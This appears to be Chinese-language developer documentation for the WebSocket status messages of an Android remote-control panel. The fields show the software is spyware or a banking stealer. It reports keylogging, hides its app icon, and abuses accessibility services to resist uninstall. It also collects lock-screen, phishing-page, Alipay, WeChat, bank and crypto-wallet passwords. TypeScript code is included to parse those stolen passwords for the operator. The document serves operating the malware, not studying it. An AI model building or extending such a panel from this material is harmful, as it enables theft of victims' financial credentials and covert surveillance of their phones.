# 设备状态字段参考文档

> 本文档详细说明 WebSocket 通信中设备状态消息的字段含义。

## statusBatch 消息结构

当 Web Panel 发送 `join` 或 `ping` 请求时，服务器返回 `statusBatch` 消息：

```json
{
    "type": "statusBatch",
    "pid": "14027005124596051",
    "serverToPhone": "OPEN",
    "lastPing": "2026-02-02 22:02:01",
    "phoneInfo": { ... }
}
```

---

## 顶层字段

| 字段 | 类型 | 值示例 | 含义 |
|------|------|--------|------|
| `type` | string | `"statusBatch"` | 消息类型标识 |
| `pid` | string | `"14027005124596051"` | 设备唯一标识符 (Phone ID) |
| `serverToPhone` | string | `"OPEN"` / `"CLOSED"` | WebSocket 连接状态 |
| `lastPing` | string | `"2026-02-02 22:02:01"` | 最后心跳时间 (格式化) |
| `phoneInfo` | object | `{...}` | 设备详细信息 |

### serverToPhone 状态值

| 值 | 含义 |
|----|------|
| `OPEN` | 设备在线，WebSocket 连接正常 |
| `CLOSED` | 设备离线 |
| `CONNECTING` | 正在连接 (少见) |
| `CLOSING` | 正在断开 (少见) |

---

## phoneInfo 字段详解

### 基础信息

| 字段 | 类型 | 值示例 | 含义 |
|------|------|--------|------|
| `pid` | string | `"14027005124596051"` | 设备 ID (与顶层 pid 相同) |
| `phone_id` | string | `"14027005124596051"` | 设备 ID (原始字段名，与 pid 相同) |
| `is_online` | boolean | `true` | 在线状态 (服务端添加) |
| `lastPing` | number | `1770069721000` | 最后心跳时间戳 (毫秒) |
| `phone_name` | string | `"mumu"` | 设备名称/备注 (用户可修改) |
| `model` | string | `"PGT-AN20"` | 手机型号 |
| `android_version` | string | `"Android 12"` | 安卓系统版本 |
| `country` | string | `"CN"` | 国家代码 (ISO 3166-1) |
| `ip` | string | `"10.0.2.15"` | 设备当前 IP 地址 |
| `ip_location` | string | `"中国 上海"` | IP 归属地（由服务端通过 GeoLite2 解析） |
| `install_date` | string | `"2026-02-03"` | APK 安装日期 |
| `phone_number` | string | `""` | SIM 卡号码 (需权限，通常为空) |

### 状态信息

| 字段 | 类型 | 值示例 | 含义 |
|------|------|--------|------|
| `battery_charge` | string | `"t~88"` | 电池状态 (见下方格式说明) |
| `network` | string | `"WIFI"` | 网络类型：`WIFI` / `4G` / `5G` / `MOBILE` |
| `accessibility` | string | `"1"` / `"0"` | 无障碍服务：`1`=已开启, `0`=未开启 |
| `display` | string | `""` / `"0"` | 显示状态：`"0"`=隐藏图标, 其他=显示 |
| `activz` | string | `"2"` | 屏幕状态 (见下方格式说明) |
| `has_password` | string | `"0"` / `"1"` | 锁屏密码：`0`=无, `1`=有 |

#### battery_charge 格式

```
格式: "{充电状态}~{电量百分比}"

示例:
- "t~88" → 充电中 (true)，电量 88%
- "f~45" → 未充电 (false)，电量 45%
```

**解析代码示例 (TypeScript):**
```typescript
function parseBattery(batteryCharge: string) {
  const [charging, level] = batteryCharge.split('~')
  return {
    isCharging: charging === 't',
    level: parseInt(level, 10)
  }
}
```

#### activz 屏幕状态格式

设备上报的屏幕亮灭和锁定状态，前端根据此值显示对应的状态图标。

| 值 | 含义 | 对应图片 |
|----|------|----------|
| `"0"` | 屏幕亮 + 已锁定 | `ON_LOCK.png` |
| `"1"` | 屏幕灭 + 已锁定 | `OFF_LOCK.png` |
| `"2"` | 屏幕亮 + 未锁定 | `ON.png` |
| `"3"` | 屏幕灭 + 未锁定 | `OFF.png` |
| 其他 | 未知状态 | `known.png` |

**解析代码示例 (TypeScript):**
```typescript
function getScreenStatus(activz: string): { isScreenOn: boolean; isLocked: boolean; label: string } {
  switch (activz) {
    case '0': return { isScreenOn: true, isLocked: true, label: '亮屏已锁' };
    case '1': return { isScreenOn: false, isLocked: true, label: '息屏已锁' };
    case '2': return { isScreenOn: true, isLocked: false, label: '亮屏解锁' };
    case '3': return { isScreenOn: false, isLocked: false, label: '息屏解锁' };
    default: return { isScreenOn: false, isLocked: false, label: '未知' };
  }
}
```

### 用户信息

| 字段 | 类型 | 值示例 | 含义 |
|------|------|--------|------|
| `user_email` | string | `"admin@qq.com"` | 绑定的用户邮箱 |
| `phone` | string | `""` | 手机号码 (可选，通常为空) |

### 日志信息

| 字段 | 类型 | 值示例 | 含义 |
|------|------|--------|------|
| `keylogs` | string | `"2026-02-03*"` | 键盘记录日期，`*` 后缀表示有新记录 |

#### keylogs 格式

```
格式: "{日期}" 或 "{日期}*"

示例:
- "2026-02-03"  → 有记录，无新内容
- "2026-02-03*" → 有记录，且有未读新内容
- ""            → 无记录
```

### 密码信息

| 字段 | 类型 | 含义 |
|------|------|------|
| `phone_password` | string | 收集到的各类密码信息 (格式化字符串) |

### 媒体信息

| 字段 | 类型 | 值示例 | 含义 |
|------|------|--------|------|
| `wallpap` | string | `"iVBORw0KGgo..."` | 设备壁纸缩略图 (Base64 PNG, 约 45x45px) |

> **注意**: `wallpap` 字段数据量较大 (约 2-5KB)，在设备列表等场景可能需要过滤。

#### phone_password 格式解析

```
手机密码: {锁屏密码}
钓鱼密码: {钓鱼页面获取的密码}
Alipay密码: {支付宝}
Wechat密码: {微信}
云密码: {云服务}
建密码: {建设银行}
农密码: {农业银行}
中密码: {中国银行}
工密码: {工商银行}
招密码: {招商银行}
gp密码: {Google Play}
pe密码: {其他应用}
an密码: {其他应用}
mb密码: {其他应用}
bc密码: {其他应用}
Trust密码: {Trust Wallet}
Imtoken密码: {imToken 钱包}
Tokenpocket密码: {TokenPocket 钱包}
```

**解析代码示例 (TypeScript):**
```typescript
function parsePasswords(passwordStr: string): Record<string, string> {
  const result: Record<string, string> = {}
  const lines = passwordStr.split(/\s+(?=\S+密码:)/)
  
  for (const line of lines) {
    const match = line.match(/^(.+密码):\s*(.*)$/)
    if (match) {
      result[match[1]] = match[2].trim()
    }
  }
  
  return result
}
```

---

## 完整示例

```json
{
    "type": "statusBatch",
    "pid": "14027005124596051",
    "serverToPhone": "OPEN",
    "lastPing": "2026-02-02 22:02:01",
    "phoneInfo": {
        "pid": "14027005124596051",
        "is_online": true,
        "lastPing": 1770069721000,
        "phone_name": "mumu",
        "model": "PGT-AN20",
        "android_version": "Android 12",
        "battery_charge": "t~88",
        "accessibility": "1",
        "country": "CN",
        "user_email": "admin@qq.com",
        "install_date": "2026-02-03",
        "keylogs": "2026-02-03*",
        "phone_password": "手机密码: ... ",
        "display": "",
        "activz": "2",
        "phone": "",
        "ip": "10.0.2.15",
        "has_password": "0"
    }
}
```

---

## 相关消息类型

### deviceOnline / deviceOffline

设备上线/下线时推送给订阅的 Panel：

```json
{
    "type": "deviceOnline",
    "pid": "14027005124596051",
    "deviceInfo": { ... },
    "stats": {
        "total": 10,
        "online": 5,
        "offline": 5
    }
}
```

### deviceUpdate

设备状态更新时推送：

```json
{
    "type": "deviceUpdate",
    "pid": "14027005124596051",
    "phoneInfo": { ... }
}
```

---

## 注意事项

1. **accessibility 字段** - 这是防卸载功能的前提条件，但不代表防卸载已启用
2. **时间戳格式** - `lastPing` 在 phoneInfo 中是毫秒时间戳，顶层是格式化字符串
3. **空值处理** - 很多字段可能为空字符串 `""`，前端需要做好空值判断
4. **密码字段** - `phone_password` 是格式化的多行字符串，需要解析后使用

---

## 相关文档

- [WEBSOCKET_CLIENT.md](./WEBSOCKET_CLIENT.md) - WebSocket 系统架构
- [WEBSOCKET_SERVER_PHP.md](./WEBSOCKET_SERVER_PHP.md) - PHP WebSocket 服务器实现
- [../WEBSOCKET_SERVER.md](../WEBSOCKET_SERVER.md) - Node.js WebSocket 服务器 (旧版)
